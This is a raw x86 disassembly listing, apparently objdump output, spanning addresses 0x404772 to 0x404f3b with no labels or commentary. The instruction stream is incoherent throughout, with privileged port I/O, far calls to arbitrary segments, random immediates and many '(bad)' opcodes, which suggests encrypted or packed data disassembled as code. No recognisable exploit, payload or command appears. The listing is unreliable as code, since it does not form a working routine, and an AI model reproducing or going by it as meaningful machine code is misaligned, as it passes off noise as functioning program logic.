  404772:	xchg   ebp,eax
  404773:	cmp    dh,dl
  404775:	imul   ebx,DWORD PTR [eax+0x149a45ab],0xffffff93
  40477c:	mov    eax,0x7ba5715e
  404781:	sub    eax,DWORD PTR [ebx+0x55]
  404784:	shr    BYTE PTR [esi-0x53],cl
  404787:	mov    dl,0x34
  404789:	outs   dx,BYTE PTR ds:[esi]
  40478a:	in     al,0x33
  40478c:	loop   0x404741
  40478e:	ins    BYTE PTR es:[edi],dx
  40478f:	add    al,0xe6
  404791:	xchg   esp,eax
  404792:	or     BYTE PTR [edi-0x7],dh
  404795:	adc    dh,bh
  404797:	pusha  
  404798:	push   cs
  404799:	sub    al,0xa1
  40479b:	and    dh,BYTE PTR [ecx+0x545d7501]
  4047a1:	mov    al,0x3b
  4047a3:	enter  0xbf64,0x82
  4047a7:	jl     0x4047ab
  4047a9:	popf   
  4047aa:	lods   al,BYTE PTR ds:[esi]
  4047ab:	loopne 0x40482b
  4047ad:	loop   0x4047d9
  4047af:	imul   eax,DWORD PTR [edi+0x4],0x140592f4
  4047b6:	into   
  4047b7:	inc    esi
  4047b8:	out    dx,al
  4047b9:	test   eax,0xb28d6bfe
  4047be:	ret    0xf7d9
  4047c1:	jnp    0x4047a8
  4047c3:	jae    0x40478d
  4047c5:	add    ecx,DWORD PTR [ebp-0x5280f728]
  4047cb:	inc    edi
  4047cc:	inc    ebp
  4047cd:	js     0x40483e
  4047cf:	and    BYTE PTR [ebx+0x2d],cl
  4047d2:	out    dx,eax
  4047d3:	dec    ebx
  4047d4:	std    
  4047d5:	popa   
  4047d6:	sub    DWORD PTR [edi-0x65],ebp
  4047d9:	outs   dx,BYTE PTR ds:[esi]
  4047da:	imul   edi,DWORD PTR [ebx],0x50
  4047dd:	sbb    dh,BYTE PTR [edi]
  4047df:	inc    ecx
  4047e0:	call   0x17da6997
  4047e5:	mov    esi,0xb7a3c11c
  4047ea:	imul   BYTE PTR ss:[eax-0x7ea7e065]
  4047f1:	fadd   st(2),st
  4047f3:	push   0x371285ed
  4047f8:	jge    0x40480d
  4047fa:	ins    DWORD PTR es:[edi],dx
  4047fb:	mov    ebp,0x84a47c03
  404800:	inc    edi
  404801:	xor    bl,BYTE PTR [ecx-0x63]
  404804:	loop   0x4047d5
  404806:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404807:	call   0x24052ace
  40480c:	out    0xb,eax
  40480e:	lds    ecx,FWORD PTR [ebx+0xc]
  404811:	retf   0x6570
  404814:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404815:	ins    DWORD PTR es:[edi],dx
  404816:	mov    BYTE PTR [esi-0x514131e9],cl
  40481c:	imul   eax,DWORD PTR [ecx],0x485214af
  404822:	sub    ebp,ecx
  404824:	cld    
  404825:	addr16 sbb al,0x80
  404828:	es sbb ecx,0x7b6c7db3
  40482f:	push   esp
  404830:	mov    edi,0xb08cf89e
  404835:	cs das 
  404837:	imul   DWORD PTR [eax+0xec7177c]
  40483d:	push   edi
  40483e:	(bad)  
  40483f:	(bad)  
  404840:	mov    edi,0x1c32ebff
  404845:	and    DWORD PTR [ecx-0x148c3b29],esp
  40484b:	stos   DWORD PTR es:[edi],eax
  40484c:	mov    bl,0x3c
  40484e:	rol    DWORD PTR [eax+0x1eb53cbd],0x83
  404855:	jp     0x40486a
  404857:	cmp    edi,DWORD PTR [edx+0x62a9e781]
  40485d:	mov    ch,0xd5
  40485f:	js     0x404816
  404861:	test   eax,0x30df811c
  404866:	loope  0x404800
  404868:	imul   edi,DWORD PTR [eax],0xffffffaf
  40486b:	and    cl,BYTE PTR [edx+edx*8+0x53cc9cc0]
  404872:	in     al,0x79
  404874:	jb     0x404850
  404876:	cld    
  404877:	ins    DWORD PTR es:[edi],dx
  404878:	sbb    edx,ecx
  40487a:	lock push esi
  40487c:	jo     0x404819
  40487e:	das    
  40487f:	call   0x88c1:0x5ab52c2a
  404886:	inc    edx
  404887:	pop    ebp
  404888:	sbb    eax,0x450d066a
  40488d:	fistp  QWORD PTR [ebx]
  40488f:	fcomp  DWORD PTR ds:0x58c42dc2
  404895:	jmp    0xec10:0xf7e7c2a6
  40489c:	clc    
  40489d:	push   ds
  40489e:	sub    ebx,DWORD PTR [esi-0x7cdf0eef]
  4048a4:	mov    dl,0xd5
  4048a6:	(bad)  
  4048a7:	fiadd  DWORD PTR [esi-0xb]
  4048aa:	stos   BYTE PTR es:[edi],al
  4048ab:	es (bad) 
  4048ad:	cmp    ch,dl
  4048af:	dec    ecx
  4048b0:	jb     0x4048f7
  4048b2:	pushf  
  4048b3:	pop    esi
  4048b4:	xlat   BYTE PTR ds:[ebx]
  4048b5:	test   al,0x79
  4048b7:	jp     0x4048a4
  4048b9:	shr    BYTE PTR [ebp+esi*8+0x15ef5f82],cl
  4048c0:	xchg   esi,eax
  4048c1:	jg     0x40485c
  4048c3:	in     al,dx
  4048c4:	retf   0x2bad
  4048c7:	cwde   
  4048c8:	call   eax
  4048ca:	mov    eax,0xa71bbe55
  4048cf:	mov    ecx,0x39a5c24f
  4048d4:	out    0xe,eax
  4048d6:	jle    0x40489c
  4048d8:	and    ch,BYTE PTR [ebx+ebp*2+0x17e0ec13]
  4048df:	pusha  
  4048e0:	(bad)  
  4048e1:	mov    al,0x90
  4048e3:	fwait
  4048e4:	push   edx
  4048e5:	(bad)  
  4048e6:	sbb    ebx,DWORD PTR [edx]
  4048e8:	cmp    ah,BYTE PTR [ebp-0x4d5f4b88]
  4048ee:	pop    ecx
  4048ef:	enter  0xe858,0xd1
  4048f3:	arpl   bx,bx
  4048f5:	sbb    ch,al
  4048f7:	or     esi,edx
  4048f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048fa:	jnp    0x404892
  4048fc:	jl     0x4048b6
  4048fe:	loope  0x404946
  404900:	sub    ah,BYTE PTR [ecx-0x9]
  404903:	mov    esp,0x50567c81
  404908:	daa    
  404909:	sub    al,0xc1
  40490b:	stc    
  40490c:	inc    ecx
  40490d:	loopne 0x4048d5
  40490f:	pop    ebx
  404910:	xor    cl,dl
  404912:	dec    ebx
  404913:	in     eax,dx
  404914:	mov    ds:0x40e4cfc7,al
  404919:	aaa    
  40491a:	inc    ecx
  40491b:	aad    0xe5
  40491d:	loop   0x4048be
  40491f:	fild   DWORD PTR [edi+0x1ab2cdda]
  404925:	push   eax
  404926:	ss cli 
  404928:	xor    al,BYTE PTR [eax+0x7]
  40492b:	fsub   DWORD PTR [ebp-0x5295c84d]
  404931:	aaa    
  404932:	or     DWORD PTR [ebp+edx*1-0x23fd682f],eax
  404939:	std    
  40493a:	cmp    bh,bh
  40493c:	pop    ss
  40493d:	sbb    bl,al
  40493f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404940:	ficomp WORD PTR [esi-0x6e59f49c]
  404946:	inc    ebx
  404947:	bound  ebp,QWORD PTR [edx-0x4ff3db4]
  40494d:	mov    BYTE PTR [edx-0x4407709b],al
  404953:	dec    esi
  404954:	mov    esp,0xb6d2adfb
  404959:	xchg   BYTE PTR [edi-0x3],ch
  40495c:	(bad)  
  40495d:	jg     0x404960
  40495f:	dec    ecx
  404960:	cld    
  404961:	lods   al,BYTE PTR ds:[esi]
  404962:	hlt    
  404963:	inc    ecx
  404964:	rcr    BYTE PTR [ebp-0x17],1
  404967:	jae    0x40490b
  404969:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40496a:	mov    BYTE PTR [ebx],0xc5
  40496d:	mov    dl,0x29
  40496f:	out    0xa7,eax
  404971:	add    BYTE PTR es:[ebx-0x2a],ah
  404975:	add    eax,0x7ef4a348
  40497a:	call   0xa69ee783
  40497f:	sbb    al,0xcf
  404981:	(bad)  
  404982:	jp     0x404980
  404984:	mov    ecx,0xe4fde30
  404989:	adc    BYTE PTR [esi],ah
  40498b:	shl    ecx,0x2c
  40498e:	enter  0xba18,0x47
  404992:	pushf  
  404993:	mov    cs,esp
  404995:	inc    edi
  404996:	jno    0x4049db
  404998:	jp     0x40498a
  40499a:	sahf   
  40499b:	sub    DWORD PTR [edx+0x7fbee1b7],ebx
  4049a1:	add    bh,BYTE PTR [esi-0x7ed3dec1]
  4049a7:	dec    edi
  4049a8:	std    
  4049a9:	dec    ecx
  4049aa:	add    cl,BYTE PTR [esp+ecx*2]
  4049ad:	pop    ss
  4049ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049af:	mov    eax,0xe707da46
  4049b4:	xchg   edx,eax
  4049b5:	stc    
  4049b6:	jo     0x404965
  4049b8:	int    0x24
  4049ba:	mov    DWORD PTR [ecx],ebx
  4049bc:	(bad)  [edi-0x49830e67]
  4049c2:	(bad)  
  4049c3:	and    DWORD PTR [ecx],edx
  4049c5:	cmp    al,0x7
  4049c7:	push   0xffffffb7
  4049c9:	mov    DWORD PTR [ebx-0x5eef4b49],ecx
  4049cf:	cmp    DWORD PTR [esi-0x6cc1ef0e],ebp
  4049d5:	fst    st(1)
  4049d7:	push   edi
  4049d8:	out    dx,al
  4049d9:	loop   0x404a2c
  4049db:	loop   0x4049a4
  4049dd:	jg     0x4049e8
  4049df:	into   
  4049e0:	xor    BYTE PTR [ebx+0x730da116],dl
  4049e6:	stos   DWORD PTR es:[edi],eax
  4049e7:	fld    DWORD PTR [edx+0x50]
  4049ea:	pop    es
  4049eb:	aaa    
  4049ec:	mov    ecx,0x21ad2cd
  4049f1:	bound  edx,QWORD PTR [eax]
  4049f3:	in     al,dx
  4049f4:	mov    eax,edx
  4049f6:	dec    ebx
  4049f7:	mov    dl,0xbf
  4049f9:	test   ebx,ecx
  4049fb:	cs cdq 
  4049fd:	and    al,0xbd
  4049ff:	pop    esi
  404a00:	mov    cl,0xbf
  404a02:	push   cs
  404a03:	dec    esp
  404a04:	push   ecx
  404a05:	ja     0x404a1b
  404a07:	jge    0x40498f
  404a09:	sbb    ebp,DWORD PTR ds:0x49df3c12
  404a0f:	inc    esp
  404a10:	es lods al,BYTE PTR es:[esi]
  404a13:	das    
  404a14:	repnz inc eax
  404a16:	ss mov dl,0x2d
  404a19:	xchg   esp,eax
  404a1a:	push   edx
  404a1b:	popf   
  404a1c:	add    esp,DWORD PTR [edi]
  404a1e:	popa   
  404a1f:	lods   eax,DWORD PTR ds:[esi]
  404a20:	cmc    
  404a21:	sub    DWORD PTR [edi],0xf8e31b46
  404a27:	jae    0x404a5b
  404a29:	jl     0x404a97
  404a2b:	mov    dh,0xe3
  404a2d:	and    ebp,esi
  404a2f:	add    ebp,0xd06b0860
  404a35:	mov    dl,0x99
  404a37:	bound  ecx,QWORD PTR [edx+0x58]
  404a3a:	mov    ch,0x20
  404a3c:	(bad)  
  404a3d:	loopne 0x404a0c
  404a3f:	xor    cl,cl
  404a41:	or     DWORD PTR [edx+0x5697f990],ebx
  404a47:	dec    esp
  404a48:	jae    0x404a55
  404a4a:	sbb    al,0x3e
  404a4c:	inc    ebx
  404a4d:	pushf  
  404a4e:	jno    0x404a8c
  404a50:	retf   
  404a51:	fstp   DWORD PTR [edx+0x32e29576]
  404a57:	adc    al,0xc6
  404a59:	repz mov edi,0x265c71d3
  404a5f:	jge    0x404a42
  404a61:	jge    0x404a29
  404a63:	mov    BYTE PTR [eax-0x11],ah
  404a66:	std    
  404a67:	cmc    
  404a68:	imul   esi,ebp,0xc33436d3
  404a6e:	aam    0xb4
  404a70:	mov    ds:0x65097a65,eax
  404a75:	sbb    DWORD PTR [ebx],0x2ee9bb15
  404a7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a7c:	or     dh,BYTE PTR [edi]
  404a7e:	adc    ebx,edi
  404a80:	cwde   
  404a81:	lds    esp,FWORD PTR [edi+eax*1-0xf]
  404a85:	mov    ds:0x398739fd,eax
  404a8a:	sub    dl,bh
  404a8c:	add    edx,DWORD PTR [eax]
  404a8e:	xchg   ah,ah
  404a90:	or     ah,BYTE PTR [edi+0x55085088]
  404a96:	ins    DWORD PTR es:[edi],dx
  404a97:	popf   
  404a98:	loopne 0x404a4e
  404a9a:	out    0x56,al
  404a9c:	add    dl,cl
  404a9e:	(bad)  
  404aa0:	cwde   
  404aa1:	cmp    DWORD PTR [ecx+0x25],0xc
  404aa5:	jae    0x404a4b
  404aa7:	addr16 inc edx
  404aa9:	das    
  404aaa:	cmp    ecx,edx
  404aac:	jle    0x404b22
  404aae:	cmp    eax,0xb1aea298
  404ab3:	xchg   edi,eax
  404ab4:	mov    ah,0x64
  404ab6:	dec    eax
  404ab7:	push   edi
  404ab8:	out    dx,al
  404ab9:	inc    ecx
  404aba:	outs   dx,DWORD PTR ds:[esi]
  404abb:	and    BYTE PTR [ebp-0x3e9178e9],ch
  404ac1:	pop    esi
  404ac2:	test   DWORD PTR [edx+0x34],edi
  404ac5:	cmc    
  404ac6:	daa    
  404ac7:	test   eax,0x8696619d
  404acc:	nop
  404acd:	dec    esi
  404ace:	aas    
  404acf:	cmp    edi,DWORD PTR [ecx-0x11]
  404ad2:	mov    ebx,0xa47a55ec
  404ad7:	mov    ah,0xf5
  404ad9:	es push edi
  404adb:	je     0x404b3e
  404add:	dec    ebx
  404ade:	retf   0xa454
  404ae1:	dec    esp
  404ae2:	xor    esp,DWORD PTR [esi]
  404ae4:	sub    ebp,ebx
  404ae6:	pop    ebx
  404ae7:	jg     0x404ae0
  404ae9:	cmp    eax,0xbe9c25c5
  404aee:	fwait
  404aef:	mov    al,0x19
  404af1:	or     eax,0xbf01d275
  404af6:	(bad)  
  404af7:	std    
  404af8:	fstp   TBYTE PTR [edx+0x61da768b]
  404afe:	mov    BYTE PTR [esi+0x1e],bh
  404b01:	dec    esp
  404b02:	sub    eax,0x2884c4be
  404b07:	pop    ds
  404b08:	and    bh,BYTE PTR [ebx]
  404b0a:	mov    esp,0xa29cb0a8
  404b0f:	shl    BYTE PTR [edi],1
  404b11:	jl     0x404aa9
  404b13:	das    
  404b14:	lock or DWORD PTR [ebx-0x736c0863],edx
  404b1b:	push   ebp
  404b1c:	daa    
  404b1d:	ins    BYTE PTR es:[edi],dx
  404b1e:	xchg   ebp,eax
  404b1f:	dec    edx
  404b20:	add    ebp,DWORD PTR [esi]
  404b22:	add    ebx,DWORD PTR [edx]
  404b24:	mov    edi,DWORD PTR [ecx-0x43d2e1b4]
  404b2a:	mov    eax,0x14b5abc5
  404b2f:	mov    al,ds:0x32ea0ad2
  404b34:	int    0xd9
  404b36:	xchg   dh,al
  404b38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b39:	sbb    DWORD PTR [ecx+0x5a6c175],ebp
  404b3f:	sbb    eax,0xfeb17a81
  404b44:	and    esp,DWORD PTR [ebp+0xa]
  404b47:	mov    dl,0x4d
  404b49:	loope  0x404acc
  404b4b:	sbb    DWORD PTR [ecx-0x3123035d],edi
  404b51:	cwde   
  404b52:	ins    DWORD PTR es:[edi],dx
  404b53:	mov    cl,0x38
  404b55:	in     eax,dx
  404b56:	std    
  404b57:	dec    esp
  404b58:	test   al,0x23
  404b5a:	into   
  404b5b:	idiv   DWORD PTR [ecx]
  404b5d:	pushf  
  404b5e:	and    bl,BYTE PTR [esi-0x60c88259]
  404b64:	inc    ebx
  404b65:	call   0xe189:0xaef08e2f
  404b6c:	lods   eax,DWORD PTR ds:[esi]
  404b6d:	rcl    DWORD PTR [eax-0xa],0x0
  404b71:	xor    bh,BYTE PTR [esi+0x57f32664]
  404b77:	mov    BYTE PTR [edx],ch
  404b79:	gs std 
  404b7b:	daa    
  404b7c:	les    edx,FWORD PTR [edi]
  404b7e:	pop    edi
  404b7f:	fs (bad) 
  404b81:	enter  0x5ed0,0xf7
  404b85:	push   edx
  404b86:	xor    BYTE PTR [eax-0x64],cl
  404b89:	xchg   edx,eax
  404b8a:	and    DWORD PTR [edi-0x59],0x3da3172c
  404b91:	pop    edx
  404b92:	popa   
  404b93:	cmc    
  404b94:	fimul  DWORD PTR [edi+ebx*2+0x330e3d6b]
  404b9b:	repnz (bad) 
  404b9d:	out    0x1,eax
  404b9f:	add    al,0x51
  404ba1:	xchg   bx,ax
  404ba3:	xor    esi,DWORD PTR [eax-0x7bc68ab]
  404ba9:	xchg   esi,eax
  404baa:	push   cs
  404bab:	xchg   ecx,eax
  404bac:	add    eax,0xce91f57f
  404bb1:	imul   DWORD PTR [edi+eax*2+0x41d818e5]
  404bb8:	inc    eax
  404bb9:	adc    edi,DWORD PTR [eax-0x3d5f9731]
  404bbf:	jnp    0x404b9e
  404bc1:	lahf   
  404bc2:	sbb    BYTE PTR [esi],dh
  404bc4:	add    eax,0x95d2a0db
  404bc9:	push   eax
  404bca:	fwait
  404bcb:	bound  esi,QWORD PTR [edx-0x1e]
  404bce:	retf   0x8252
  404bd1:	sub    BYTE PTR [eax+ebx*4+0x5517f730],bl
  404bd8:	loop   0x404b88
  404bda:	mov    esp,0x4e74707c
  404bdf:	ret    0x76bd
  404be2:	cli    
  404be3:	pop    ds
  404be4:	jb     0x404bc0
  404be6:	mov    ebp,0x355b4c89
  404beb:	lea    ebx,[esi+esi*4-0x50b2965b]
  404bf2:	pop    ebx
  404bf3:	int    0x4e
  404bf5:	imul   esp,DWORD PTR [edi],0x83d74665
  404bfb:	lods   al,BYTE PTR ds:[esi]
  404bfc:	jecxz  0x404bb3
  404bfe:	mov    DWORD PTR [esp+ecx*2],ebp
  404c01:	and    eax,0xc68a32d6
  404c06:	mov    eax,ds:0x2937f406
  404c0b:	mov    bl,0x60
  404c0d:	pop    ecx
  404c0e:	jecxz  0x404c6d
  404c10:	add    eax,0xf974ad04
  404c15:	jmp    0x75b:0x6e35ccd7
  404c1c:	jmp    0x8e19f79
  404c21:	daa    
  404c22:	or     esi,DWORD PTR [edx+0x1b]
  404c25:	loop   0x404c6d
  404c27:	inc    BYTE PTR [ecx]
  404c29:	cli    
  404c2a:	or     DWORD PTR [ecx+0x20],edx
  404c2d:	adc    al,0xfa
  404c2f:	leave  
  404c30:	dec    esi
  404c31:	dec    ecx
  404c32:	or     eax,0x6d14acde
  404c37:	fs hlt 
  404c39:	sub    BYTE PTR [edx+0x23],0x81
  404c3d:	jo     0x404c6e
  404c3f:	aad    0x42
  404c41:	pop    ds
  404c42:	xchg   esp,eax
  404c43:	mov    ecx,0xdd3bc89b
  404c48:	pop    esi
  404c49:	jo     0x404bd3
  404c4b:	mov    esp,0x7ffdc920
  404c50:	pop    ds
  404c51:	cmc    
  404c52:	test   BYTE PTR [ebp+0x7fc18e07],dl
  404c58:	lock loope 0x404cd2
  404c5b:	imul   edx,ebx,0xfdc5efd
  404c61:	sub    BYTE PTR [edx-0x75],bl
  404c64:	mov    esp,0x3b580f6d
  404c69:	xchg   DWORD PTR ds:0xf9fd6d29,edi
  404c6f:	(bad)  
  404c70:	mov    ch,0x39
  404c72:	test   eax,0xdaab346e
  404c77:	xchg   edi,eax
  404c78:	ret    0xac55
  404c7b:	xchg   ecx,eax
  404c7c:	imul   ecx,DWORD PTR [edx-0x3e675db8],0x775b32b8
  404c86:	ror    esi,1
  404c88:	rcl    BYTE PTR [ebp+0x379f9547],0x57
  404c8f:	push   es
  404c90:	push   0x21
  404c92:	push   eax
  404c93:	fs fwait
  404c95:	call   0xfbac:0x77d14663
  404c9c:	test   al,0x4b
  404c9e:	xchg   ebx,eax
  404c9f:	sub    al,0x7d
  404ca1:	add    edx,DWORD PTR [ecx-0x52]
  404ca4:	and    cl,ah
  404ca6:	mov    ah,0x46
  404ca8:	xchg   ebx,eax
  404ca9:	out    dx,eax
  404caa:	test   edx,esi
  404cac:	push   esp
  404cad:	jnp    0x404c64
  404caf:	mov    dh,0x2
  404cb1:	mov    DWORD PTR [ebx+ecx*4],ebp
  404cb4:	sub    al,0xce
  404cb6:	mov    bl,0xf5
  404cb8:	cmp    BYTE PTR [esi],ah
  404cba:	in     eax,0x8f
  404cbc:	fadd   QWORD PTR [bp+si]
  404cbf:	add    DWORD PTR [eax-0x1601d4f6],esp
  404cc5:	ds fs pop ds
  404cc8:	inc    ebx
  404cc9:	mov    esp,DWORD PTR [edi]
  404ccb:	cmp    bl,BYTE PTR [ebx]
  404ccd:	clc    
  404cce:	lds    esp,FWORD PTR [ecx-0x19]
  404cd1:	cld    
  404cd2:	inc    eax
  404cd3:	js     0x404cb6
  404cd5:	shr    edi,1
  404cd7:	(bad)  
  404cd8:	sub    bl,dl
  404cda:	or     al,ch
  404cdc:	mov    ch,0xc2
  404cde:	test   DWORD PTR [esi],edi
  404ce0:	leave  
  404ce1:	xor    edx,edx
  404ce3:	popa   
  404ce4:	scas   al,BYTE PTR es:[edi]
  404ce5:	scas   eax,DWORD PTR es:[edi]
  404ce6:	ror    BYTE PTR ds:0x6ffa3a71,cl
  404cec:	sbb    BYTE PTR [ecx],cl
  404cee:	xchg   edx,eax
  404cef:	push   edx
  404cf0:	adc    dl,BYTE PTR fs:[ecx+eax*4]
  404cf4:	pop    ebx
  404cf5:	lock dec edx
  404cf7:	mov    edx,0x8c13528e
  404cfc:	mov    ds:0x155e5d5f,al
  404d01:	jb     0x404d79
  404d03:	cs mov esp,0x29293fc8
  404d09:	xchg   DWORD PTR [ebx+esi*2+0x6f],esp
  404d0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d0f:	mov    ebx,0x6e6b8419
  404d14:	inc    esi
  404d15:	jmp    0xf98c:0x5619af5b
  404d1c:	popf   
  404d1d:	cwde   
  404d1e:	push   ebx
  404d1f:	stc    
  404d20:	push   edi
  404d21:	jle    0x404d92
  404d23:	(bad)  
  404d24:	jle    0x404d2a
  404d26:	add    DWORD PTR [eax+0x4a3edd3d],edx
  404d2c:	jmp    0x3c3e:0x8b112038
  404d33:	shr    dh,0xe3
  404d36:	mov    bh,0x5e
  404d38:	popf   
  404d39:	into   
  404d3a:	xchg   esp,eax
  404d3b:	xchg   DWORD PTR [eax-0x33913da5],esp
  404d41:	sbb    DWORD PTR [esi+0x4e],ebp
  404d44:	sub    ebx,DWORD PTR [edx]
  404d46:	ja     0x404d61
  404d48:	mov    al,0xe6
  404d4a:	mov    eax,0xade61ac0
  404d4f:	jno    0x404cfb
  404d51:	imul   edx,DWORD PTR [edx],0x2
  404d54:	push   0x6e
  404d56:	aas    
  404d57:	mov    al,ds:0x85a008e0
  404d5c:	scas   eax,DWORD PTR es:[edi]
  404d5d:	inc    ebp
  404d5e:	jne    0x404ce8
  404d60:	xor    dl,bl
  404d62:	sbb    bl,BYTE PTR [eax+0x29a54da3]
  404d68:	in     eax,0xbd
  404d6a:	call   0x581bc8cb
  404d6f:	cmc    
  404d70:	xchg   BYTE PTR [esi+0x24],dh
  404d73:	(bad)
  404d76:	adc    eax,0x9d10e9fa
  404d7b:	out    0x2e,al
  404d7d:	bnd jge 0x404db0
  404d80:	jae    0x404dc2
  404d82:	fwait
  404d83:	sbb    edx,edi
  404d85:	call   0x676f:0xbb776b26
  404d8c:	adc    DWORD PTR [edx+0x40dbc1ff],ebx
  404d92:	dec    edx
  404d93:	push   edx
  404d94:	scas   eax,DWORD PTR es:[edi]
  404d95:	pop    esi
  404d96:	or     BYTE PTR [edx],bh
  404d98:	pop    esi
  404d99:	mov    dh,0x8c
  404d9b:	stc    
  404d9c:	jae    0x404dd0
  404d9e:	aam    0x28
  404da0:	lods   al,BYTE PTR ds:[esi]
  404da1:	and    dl,BYTE PTR [ebp-0x50c81fb8]
  404da7:	push   cs
  404da8:	push   edx
  404da9:	imul   edx,DWORD PTR [eax+0x6c673f7d],0x4a
  404db0:	jb     0x404d6b
  404db2:	xchg   edx,eax
  404db3:	cs mov ch,0x6e
  404db6:	cmp    eax,DWORD PTR [edi]
  404db8:	jg     0x404df5
  404dba:	(bad)  
  404dbb:	mov    edx,DWORD PTR [edi+edi*4]
  404dbe:	pop    esp
  404dbf:	out    0xa4,eax
  404dc1:	ins    DWORD PTR es:[edi],dx
  404dc2:	ror    DWORD PTR [edi+0x4c7979c7],0x0
  404dc9:	cmp    al,0x17
  404dcb:	cmc    
  404dcc:	call   0x5802:0xd55db911
  404dd3:	cmp    eax,DWORD PTR [esi+eiz*4]
  404dd6:	inc    ecx
  404dd7:	shl    edi,1
  404dd9:	dec    ecx
  404dda:	jecxz  0x404e28
  404ddc:	out    dx,eax
  404ddd:	mov    al,0x95
  404de0:	xchg   edx,eax
  404de1:	pop    ss
  404de2:	dec    edi
  404de3:	and    edx,DWORD PTR [ebx-0x4ad96e1f]
  404de9:	inc    esp
  404dea:	pop    edx
  404deb:	rcr    DWORD PTR [ebp+0x5b],1
  404dee:	xchg   esp,eax
  404def:	and    al,BYTE PTR [eax]
  404df1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404df2:	push   es
  404df3:	fsubp  st(5),st
  404df5:	xchg   BYTE PTR [edx+0x10056270],al
  404dfb:	jne    0x404deb
  404dfd:	or     ch,al
  404dff:	(bad)  
  404e00:	rol    al,1
  404e02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e03:	js     0x404d93
  404e05:	rcr    BYTE PTR [edx],0xf0
  404e08:	and    esp,ecx
  404e0a:	sub    DWORD PTR [edx],esi
  404e0c:	aad    0xb9
  404e0e:	das    
  404e0f:	xchg   esi,eax
  404e10:	outs   dx,DWORD PTR ds:[esi]
  404e11:	push   ss
  404e12:	pop    eax
  404e13:	add    BYTE PTR [ebx],ah
  404e15:	cdq    
  404e16:	mov    WORD PTR [edi],ss
  404e18:	mov    esi,DWORD PTR [eax-0xd09ccee]
  404e1e:	pop    esi
  404e1f:	ret    
  404e20:	mov    esi,0x2968fec8
  404e25:	jno    0x404e15
  404e27:	push   0xffffff97
  404e29:	in     eax,0x32
  404e2b:	mov    ds:0x55bed64d,al
  404e30:	fdiv   DWORD PTR [esi]
  404e32:	fs rol DWORD PTR es:[ecx+0x2],0xec
  404e38:	ins    DWORD PTR es:[edi],dx
  404e39:	es dec ebp
  404e3b:	or     al,dh
  404e3d:	xchg   esp,eax
  404e3e:	sbb    BYTE PTR [eax+0x29],bh
  404e41:	xor    al,0xa1
  404e43:	sbb    DWORD PTR [edi],edi
  404e45:	cmp    ch,BYTE PTR [edx-0x447bc040]
  404e4b:	and    ecx,DWORD PTR [bp+si-0x1d7e]
  404e50:	repnz mov dh,0xed
  404e53:	sub    ebx,DWORD PTR [ebp-0x59]
  404e56:	mov    esp,0x7de54f75
  404e5b:	pushf  
  404e5c:	jno    0x404ed2
  404e5e:	dec    esp
  404e5f:	or     BYTE PTR [edx+ecx*1-0x76],al
  404e63:	sbb    al,0x7b
  404e65:	data16 and al,0x8b
  404e68:	add    al,0x38
  404e6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e6b:	jno    0x404ec8
  404e6d:	sbb    DWORD PTR [eax+0x23d27ded],0x54
  404e74:	rcl    BYTE PTR [ebp+0x2cb028a6],0xaf
  404e7b:	sar    DWORD PTR [ebp+0x309b6e71],1
  404e81:	mov    ebx,0x420c9cff
  404e86:	cdq    
  404e87:	fistp  DWORD PTR [ebx-0x6e716b5d]
  404e8d:	stc    
  404e8e:	mov    esi,0x8ab60701
  404e93:	xlat   BYTE PTR ds:[ebx]
  404e94:	add    cl,cl
  404e96:	outs   dx,BYTE PTR ds:[esi]
  404e97:	fiadd  WORD PTR [edx-0x21]
  404e9a:	cmp    edi,DWORD PTR [ecx]
  404e9c:	mov    al,BYTE PTR [ecx-0x14ec2494]
  404ea2:	add    dh,BYTE PTR [ebp-0xd]
  404ea5:	shl    DWORD PTR [edx],1
  404ea7:	cdq    
  404ea8:	imul   ebp,ebp,0x50
  404eab:	call   0xb3fb7d07
  404eb0:	ins    BYTE PTR es:[edi],dx
  404eb1:	loopne 0x404ea2
  404eb3:	aam    0x5
  404eb5:	fcom   QWORD PTR gs:[ebx]
  404eb8:	(bad)  
  404eb9:	lock sahf 
  404ebb:	and    dh,BYTE PTR [edx-0x1d]
  404ebe:	cld    
  404ebf:	aad    0xea
  404ec1:	cwde   
  404ec2:	(bad)  
  404ec3:	mov    eax,ds:0x3c9822d8
  404ec8:	je     0x404f3b
  404eca:	in     al,0x41
  404ecc:	test   BYTE PTR [ecx],dl
  404ece:	adc    DWORD PTR [ebp-0x3c3888e8],0xffffff93
  404ed5:	adc    esp,DWORD PTR [ebx]
  404ed7:	sbb    ecx,DWORD PTR [ecx-0x25d945d1]
  404edd:	aad    0x5
  404edf:	repnz push edi
  404ee1:	xchg   ecx,eax
  404ee2:	dec    esp
  404ee3:	jmp    0x404f17
  404ee5:	ja     0x404f36
  404ee7:	(bad)  
  404ee8:	pop    eax
  404ee9:	sub    edi,eax
  404eeb:	loop   0x404eae
  404eed:	(bad)  
  404eee:	loop   0x404eec
  404ef0:	sub    DWORD PTR [ebx-0x5ad62442],0xb01ce0e0
  404efa:	inc    eax
  404efb:	dec    edi
  404efc:	mov    edx,0x204b05ff
  404f01:	push   ecx
  404f02:	add    eax,0x64b9d707
  404f07:	repz mov bh,0xb0
  404f0a:	xchg   BYTE PTR [eax],dh
  404f0c:	add    eax,0xe6ea718
  404f11:	mov    esi,ebp
  404f13:	jnp    0x404f40
  404f15:	adc    edi,DWORD PTR [esi+0xaf31e8c]
  404f1b:	xor    edx,eax
  404f1d:	jo     0x404efa
  404f1f:	sbb    eax,0xc19cb558
  404f24:	ret    0xad21
  404f27:	pop    edi
  404f28:	jl     0x404f82
  404f2a:	ss or  al,0xee
  404f2d:	ins    DWORD PTR es:[edi],dx
  404f2e:	mov    dh,BYTE PTR [esi-0x3e]
  404f31:	lds    ebx,FWORD PTR [esi+0x7ccf941e]
  404f37:	push   ds
  404f38:	es adc al,0xe3
  404f3b:	std    
